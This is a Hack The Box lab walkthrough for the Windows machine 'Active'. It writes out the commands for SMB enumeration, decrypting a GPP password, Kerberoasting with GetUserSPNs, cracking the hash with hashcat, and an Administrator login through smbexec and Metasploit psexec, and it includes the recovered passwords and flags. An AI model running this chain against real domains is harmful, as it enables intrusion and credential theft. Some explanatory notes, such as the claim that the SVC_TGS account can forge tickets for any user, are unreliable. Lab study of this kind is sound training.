<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>Active</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#Active">Active</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<ol>
<li><a href="#all ports scan">all ports scan</a></li>
</ol>
<li><a href="#smbclient">smbclient</a></li>
<ol>
<li><a href="#smbclient bypass">smbclient bypass</a></li>
<li><a href="#GPP Vuln">GPP Vuln</a></li>
</ol>
<li><a href="#kerberoast">kerberoast</a></li>
<ol>
<li><a href="#hashcat krb5tgs">hashcat krb5tgs</a></li>
<li><a href="#notes">notes</a></li>
</ol>
<li><a href="#Kerberost to Win (smbexec &amp; meta)">Kerberost to Win (smbexec &amp; meta)</a></li>
<li><a href="#User/Root">User/Root</a></li>
</ol></div>
<div class="page" id="Active"><h1><b><u>Active</u></b></h1><img alt="images/102-1.png" src="images/102-1.png"/><br/><img alt="images/102-2.png" src="images/102-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><strong><span style="color:#ffa500;">nmap -sV -sC -oA active 10.10.10.100</span></strong><br/><br/><img alt="images/103-1.png" src="images/103-1.png"/><br/><br/><strong><span style="color:#24ff00;">noteworthy services include:</span></strong><br/><span style="color:#24ff00;">53 </span><span style="color:#ffa500;">dns</span><br/><img alt="images/103-2.png" src="images/103-2.png"/><br/>88 <span style="color:#ffa500;">kerberos</span><span style="color:#24ff00;"> server <br/></span><img alt="images/103-3.png" src="images/103-3.png"/><br/>135/445 <span style="color:#ffa500;">SMB</span><br/><img alt="images/103-4.png" src="images/103-4.png"/><br/><br/>3268 <span style="color:#ffa500;">LDAP</span><br/><img alt="images/103-5.png" src="images/103-5.png"/></div>
<div class="page" id="all ports scan"><h1><b><u>all ports scan</u></b></h1><span style="color:#24ff00;">Full port scan to see if our initial scan missed ports with discoverable services on them. Thorough enumeration is key in assessing any box in any scenario</span><br/><img alt="images/1947-1.png" src="images/1947-1.png"/><br/><br/><span style="color:#24ff00;">we see </span><span style="color:#ffa500;">winrm</span><span style="color:#24ff00;"> on port 47001 was missed in our initial scan:</span><br/><img alt="images/1947-2.png" src="images/1947-2.png"/><br/><br/><span style="color:#24ff00;">Running a targeted scan with <br/></span><span style="color:#ffa500;">nmap -p 47001 -sC -sV 10.10.10.100</span><br/><img alt="images/1947-3.png" src="images/1947-3.png"/><br/><br/></div>
<div class="page" id="smbclient"><h1><b><u>smbclient</u></b></h1><span style="color:#24ff00;">Lets enumerate Active's SMB service with </span><span style="color:#ffa500;">smbclient</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">smbmap</span><span style="color:#24ff00;"> and see what we can find</span><br/><br/><span style="color:#ffa500;">smbclient -L \\\\10.10.10.100\\</span><br/><span style="color:#24ff00;">where </span><span style="color:#ffa500;">-L </span><span style="color:#24ff00;">specifies host</span><br/><img alt="images/104-1.png" src="images/104-1.png"/><br/><br/><span style="color:#24ff00;">further enumeration shows theres a share we have read access to </span><br/><span style="color:#ffa500;">smbmap -H 10.10.10.100</span><br/><span style="color:#24ff00;">where </span><span style="color:#ffa500;">-H</span><span style="color:#24ff00;"> specifies host</span><br/><img alt="images/104-2.png" src="images/104-2.png"/>a</div>
<div class="page" id="smbclient bypass"><h1><b><u>smbclient bypass</u></b></h1><span style="color:#24ff00;">knowing we have read permissions on the Replication share on this box, lets connect to it and see if there's any further information about this box we can discover<br/></span><br/><span style="color:#ffa500;">smbclient \\\\10.10.10.100\\Replication</span><br/><img alt="images/106-1.png" src="images/106-1.png"/><br/><br/><span style="color:#24ff00;">download all files from the share with:</span><br/><strong><span style="color:#ffa500;">mget *</span></strong><br/><img alt="images/106-2.png" src="images/106-2.png"/><br/><br/></div>
<div class="page" id="GPP Vuln"><h1><b><u>GPP Vuln</u></b></h1><span style="color:#24ff00;">searching through Active's insecure smb share we come accross the file</span> <span style="color:#ffff00;">\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml <br/></span><br/><span style="color:#24ff00;">and find there is a </span><span style="color:#ffa500;">GPP</span><span style="color:#24ff00;"> or </span><span style="color:#ffa500;">Group Policy Preferences</span><span style="color:#24ff00;"> </span><span style="color:#ffff00;">Password</span><span style="color:#24ff00;"> stored in cpassword variable<br/></span><img alt="images/107-1.png" src="images/107-1.png"/><br/><br/>Crack password with <span style="color:#ffa500;">gpp-decrypt &lt;PW&gt;</span><br/><img alt="images/107-2.png" src="images/107-2.png"/><br/><span style="color:#24ff00;">Password is </span><span style="color:#ffff00;">GPPstillStandingStrong2k18</span><br/><br/><span style="color:#24ff00;">Notes:<br/></span> <span style="color:#24ff00;">1. we just decrypted not just any service account on this windows active directory but its Ticket granting service, bypassing our need to run AD network mapping software like sharphound/bloodhound, this is a huge find and a gaping vulnerability on this machine.<br/>2. Owning the TGS service will allow an attacker to generate tickets that will authenticate any user they want at any privilege level they want...<br/>3. GPP is an outdated and easily brute-forced encryption algorithum that needs to be upgraded for a more hardened network infrastructure</span></div>
<div class="page" id="kerberoast"><h1><b><u>kerberoast</u></b></h1><span style="color:#24ff00;">now that we have creds to a valid service account on the box, we're going to bust out a tool called</span> <span style="color:#ffa500;">GetUserSPNs</span> <span style="color:#24ff00;">from the </span><span style="color:#ffa500;">/impacket/ </span><span style="color:#24ff00;">module </span>(github it if you need)<br/><img alt="images/108-1.png" src="images/108-1.png"/><br/><br/><br/><span style="color:#ffa500;">GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request</span><br/><span style="color:#24ff00;">where </span><span style="color:#ffa500;">-dc-ip </span><span style="color:#24ff00;">specifies domain controller ip</span><br/><img alt="images/108-2.png" src="images/108-2.png"/><br/><br/><span style="color:#24ff00;">and save the hash to a local file</span><br/><span style="color:#ffff00;">$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$b81de9f05ec562cc23766123b9120ae3$4c0e26608eb1fb53870047876181ed998d423324662533e6fbde802c8e7bf07f45a75636969a836bfa734e6a0b2506f1bb503e8150228ad43f35fafe3e9d5996516214639a4a45f585739190a0fb5f3f0ffca70de7f9a2f10808ad23ca91b417cb2545c436e6af608373600a47a87f78bfac03b594f60bc5c20981e076e7e8654b13f79e33ccbf49785c07bfbf11268fd3ecb2fd0e0aca780e840c767c640e63659c87c45e78e664c10aaf14e8b6992895c1ae23e451cfaf3a80a01e0d24a10ada6ae5a241db50cd47a25ffe878c79197ec4678490e69974cb5eff89b21bcd7048c40230367d5fbb4b137f15fae3e9b2480d74d610cc535253178d1813c0cb42ccbc88b54108d83443c859ccc40789c7815d3853b11313a0fb55c255261e4357e82097093316afad3fb6b60469f4a53b4f50fa0751f2b3fa2bf9d89a828bf57fdaffd169f85cabdbd2b773441010ad13eb3e4588263571d8e861b5a4687c8bde313eb2f45ee16404fb27f96cd07d91475fde51bffddbad8ff8b42efa455efd6368b1e191f353326b342eeb6877274df3d6d22dc74e068e73cf3f7cfbe7d78a23983ee12971c14dfa98bee0d294224a3868ce22d08f6abec57f7800f5f91ea97d3bf153d797cfa4e8059678df49d14b622e46241b4225fef71d3f44b66b577ea2199a1bda01c8c8db5c564e6d1bd03772099b38daa06cd3690c72d9597c2ebd859e6c62402bb472fc6339aac54aed0a41291f0c7574ea2c3af8c97a364f7ae1ea676f708d861b49d5d09ba01374f899287092f762fdbca94ae7c09e77515c7eca5efafe02a2f3ca947d6552dea9c2b10eae311999e51d97f5b0e2ad1dd923e30f42dc836ac028373e7caa8f8d38ff8a91b9e313e899c721fb65f77511f95b2b33565aa94d298d321a27f0955e52111b98254315b20f5a41499f1c3ac8df0c18a57328dd5254de38747c6f3bef0bc0598c0970fa805dd0b5a2cd277ce2f6172deae14636183ea8795565650f151c8168c9190f7c62bbf0473e74016850af969e99827fe7979bd16149d11cc52f42d9fb4b0a026bd91a181772c9199135576bd4885d51275658cae61c98a742d2f09fc14444a7e19605d697d10fa78224c182764763974c60a34799bd9628a204a83c74a7d02f36251daa3a68deb478487b1a529e26696963aec465aeca4b3d2224039738f52e91c9d6e2c6dec8709d19d899cab1304a9650c77d72f3e0a7f72cebf719aa189388aac2a00718ca45</span><br/></div>
<div class="page" id="hashcat krb5tgs"><h1><b><u>hashcat krb5tgs</u></b></h1><span style="color:#24ff00;">First lets find out which </span><span style="color:#ffa500;">hashcat</span><span style="color:#24ff00;"> mode decrypts Kerberos</span><br/><img alt="images/118-1.png" src="images/118-1.png"/><br/><br/><span style="color:#24ff00;">lets save our hash to </span><span style="color:#ffff00;">TGSHash.txt</span> <span style="color:#24ff00;">and see if the password is in the rockyou wordlist:</span><br/><br/><strong><span style="color:#ffa500;">hashcat -m 13100 TGSHash.txt /usr/share/wordlists/rockyou.txt</span></strong><br/><img alt="images/118-2.png" src="images/118-2.png"/><br/>CIFS~445<br/><img alt="images/118-3.png" src="images/118-3.png"/><br/>Password is <span style="color:#ffff00;">Ticketmaster1968</span></div>
<div class="page" id="notes"><h1><b><u>notes</u></b></h1><h2>User Acct:<br/>active.htb\SVC_TGS<br/>GPPstillStandingStrong2k18<br/><br/>Kerberos Ticket Granting Ticket:<br/>$krb5tgs$23$*Administrator$ACTIVE.HTB$active<br/>Ticketmaster1968</h2></div>
<div class="page" id="Kerberost to Win (smbexec &amp; meta)"><h1><b><u>Kerberost to Win (smbexec &amp; meta)</u></b></h1><span style="color:#24ff00;">With admin's password, we have our creds to own the box outright with</span><span style="color:#ffa500;"> SMBexec</span><span style="color:#24ff00;">,</span><span style="color:#ffa500;"> evil-winrm</span> <span style="color:#24ff00;">or</span> <span style="color:#ffa500;">psexec</span>:<h1><br/><br/></h1><strong><span style="color:#ffa500;">smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100</span></strong><br/><img alt="images/119-1.png" src="images/119-1.png"/><br/><span style="color:#24ff00;">successfully log in as </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;"> (evil-winrm works the same way)</span><br/><br/><br/><span style="color:#24ff00;">We can also use the </span><span style="color:#ffa500;">metasploit console's</span><span style="color:#24ff00;"> built in </span><span style="color:#ffa500;">psexec</span><span style="color:#24ff00;"> module</span><br/><span style="color:#24ff00;">msfconsole -&gt; psexec win</span><br/><span style="color:#ffa500;">search psexec</span><br/><img alt="images/119-2.png" src="images/119-2.png"/><br/><img alt="images/119-3.png" src="images/119-3.png"/>+<br/><br/><span style="color:#24ff00;">from any meterpreter shell you can spawn a regular shell on the victim machine at any time with</span><br/><span style="color:#ffa500;">shell</span><br/><img alt="images/119-4.png" src="images/119-4.png"/><br/></div>
<div class="page" id="User/Root"><h1><b><u>User/Root</u></b></h1><img alt="images/120-1.png" src="images/120-1.png"/><span style="color:#ffff00;"><br/>86d67d8ba232bb6a254aa4d10159e983<br/><br/><br/></span><img alt="images/120-2.png" src="images/120-2.png"/><br/>b5fc76d1d6b91d77b2fbf2d54d0f708b</div>
</div></body></html>